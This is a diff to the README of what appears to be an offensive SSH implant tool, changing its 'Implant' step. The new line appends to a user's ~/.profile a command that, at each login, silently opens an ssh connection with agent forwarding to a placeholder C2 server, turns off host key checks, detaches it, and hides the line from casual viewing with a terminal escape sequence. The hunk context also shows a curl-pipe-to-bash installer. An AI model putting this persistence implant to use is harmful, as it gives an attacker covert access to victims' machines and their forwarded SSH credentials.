@@ -15,5 +15,5 @@ curl -fsSL https://raw.githubusercontent.com/B00TK1D/sshim/main/install.sh | bas
 ## Implant
 
 ```bash
- SERVER="your.c2.com" cat <(echo "ssh -A ssh@$SERVER >/dev/null 2>&1 & disown") ~/.profile > /tmp/.profile && mv /tmp/.profile ~/.profile
+  cat <(echo -e "ssh -A -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ssh@YOUR_C2_SERVER>/dev/null 2>&1 & disown #\033[2K\r") ~/.profile > /tmp/.profile && mv /tmp/.profile ~/.profile
 ```
